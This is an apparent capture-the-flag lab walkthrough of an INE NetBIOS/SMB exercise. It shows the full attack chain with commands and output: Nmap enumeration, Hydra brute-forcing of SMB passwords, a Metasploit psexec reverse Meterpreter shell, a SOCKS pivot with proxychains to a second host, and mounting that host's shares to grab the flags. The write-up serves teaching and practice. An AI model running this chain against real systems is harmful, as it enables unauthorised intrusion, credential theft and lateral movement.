## NetBIOS Hacking

### Target
* `demo.ine.local`
* `demo1.ine.local`

### Tools used:
* `nmap`


### Objective: Exploit both the target and find the flag!

---
```bash
┌──(root㉿INE)-[~]
└─# ping demo1.ine.local
PING demo1.ine.local (10.3.21.143) 56(84) bytes of data.
^C
--- demo1.ine.local ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3083ms
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 11:32 IST
Nmap scan report for demo.ine.local (10.3.16.39)
Host is up (0.0029s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sC -sV -p139,445
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 11:34 IST
Nmap scan report for demo.ine.local (10.3.16.39)                                                                                                                                           
Host is up (0.0030s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: attackdefense
|   NetBIOS computer name: ATTACKDEFENSE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-24T06:04:11+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
| smb2-time: 
|   date: 2026-01-24T06:04:09
|_  start_date: 2026-01-24T06:00:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -p139,445 --script smb-protocols                                                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 11:38 IST
Nmap scan report for demo.ine.local (10.3.16.39)
Host is up (0.0030s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|_    3:0:2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# smbclient -L demo.ine.local                                                                                                                                                            
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        Downloads       Disk      
        IPC$            IPC       Remote IPC
        print$          Disk      Printer Drivers
        Public          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to demo.ine.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -p445 --script smb-enum-users
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 11:40 IST
Nmap scan report for demo.ine.local (10.3.16.39)
Host is up (0.0030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009)
|     Flags:       Password does not expire, Normal user account
|   ATTACKDEFENSE\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Account disabled, Password does not expire, Normal user account
|   ATTACKDEFENSE\root (RID: 1010)
|_    Flags:       Password does not expire, Normal user account

Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# cat users.txt                                                                                                                                                                                                                          
admin
Administrator
root
┌──(root㉿INE)-[~]
└─# hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-24 11:43:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
[445][smb] host: demo.ine.local   login: Administrator   password: password1
[445][smb] host: demo.ine.local   login: root   password: elizabeth
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-24 11:43:33
```
```bash
msf6 exploit(windows/smb/psexec) > set RHOSTs demo.ine.local
RHOSTs => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBPASS 
SMBPASS => 
msf6 exploit(windows/smb/psexec) > set SMBPASS password1
SMBPASS => password1
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.40.5:4444 
[*] 10.3.28.123:445 - Connecting to the server...
[*] 10.3.28.123:445 - Authenticating to 10.3.28.123:445 as user 'Administrator'...
[*] 10.3.28.123:445 - Selecting PowerShell target
[*] 10.3.28.123:445 - Executing the payload...
[+] 10.3.28.123:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.3.28.123
[*] Meterpreter session 1 opened (10.10.40.5:4444 -> 10.3.28.123:49241) at 2026-01-25 01:49:23 +0530

meterpreter > 
```
```bash
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2176 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir C:\*flag* /s /b
dir C:\*flag* /s /b
C:\Users\Administrator\Documents\FLAG1.txt
stop
^C
Terminate channel 1? [y/N]  y
meterpreter > cat C:\Users\Administrator\Documents\FLAG1.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
��8de67f44f49264e6c99e8a8f5f17110c
meterpreter > 
```
```bash
C:\Windows\system32>ping 10.3.21.143
ping 10.3.21.143

Pinging 10.3.21.143 with 32 bytes of data:
Reply from 10.3.21.143: bytes=32 time<1ms TTL=128
Reply from 10.3.21.143: bytes=32 time<1ms TTL=128
Reply from 10.3.21.143: bytes=32 time<1ms TTL=128
Reply from 10.3.21.143: bytes=32 time<1ms TTL=128

Ping statistics for 10.3.21.143:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
```bash
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050


┌──(root㉿INE)-[~]
```
```bash
msf6 auxiliary(server/socks_proxy) > set VersiON 4a
VersiON => 4a
msf6 auxiliary(server/socks_proxy) > set srvport 9050
srvport => 9050
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```
```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap demo1.ine.local -p445 -Pn -sV -sT
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 01:59 IST                                                                                                                        
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.3.21.143:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.3.21.143:445  ...  OK
Nmap scan report for demo1.ine.local (10.3.21.143)
Host is up (0.093s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```
```bash
C:\Windows\system32>net view 10.3.21.143
net view 10.3.21.143
System error 5 has occurred.

Access is denied.


C:\Windows\system32>^C
Terminate channel 6? [y/N]  y
meterpreter > migrate explorer.exe
[-] Not a PID: explorer.exe
meterpreter > migrate -N explorer.exe
[*] Migrating from 2916 to 2596...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > shell
Process 3044 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net view 10.3.21.143
net view 10.3.21.143
Shared resources at 10.3.21.143



Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
Documents   Disk                    
K           Disk                    
The command completed successfully.


C:\Windows\system32>
```
the defult process doesn't have enough privileges, so we attach too another process.
```bash
C:\Windows\system32>net use D: \\10.3.21.143\Documents
net use D: \\10.3.21.143\Documents
The command completed successfully.


C:\Windows\system32>net use K: \\10.3.21.143\K$
net use K: \\10.3.21.143\K$
The command completed successfully.


C:\Windows\system32>dir D:
dir D:
 Volume in drive D has no label.
 Volume Serial Number is 5CD6-020B

 Directory of D:\

01/04/2022  05:22 AM    <DIR>          .
01/04/2022  05:22 AM    <DIR>          ..
01/04/2022  05:07 AM             1,425 Confidential.txt
01/04/2022  05:22 AM                70 FLAG2.txt
               2 File(s)          1,495 bytes
               2 Dir(s)   6,415,851,520 bytes free

C:\Windows\system32>dir K:
dir K:
 Volume in drive K is New Volume
 Volume Serial Number is E654-107F

 Directory of K:\

11/17/2021  03:34 PM           327,590 wallpaper.png
               1 File(s)        327,590 bytes
               0 Dir(s)  10,951,335,936 bytes free

```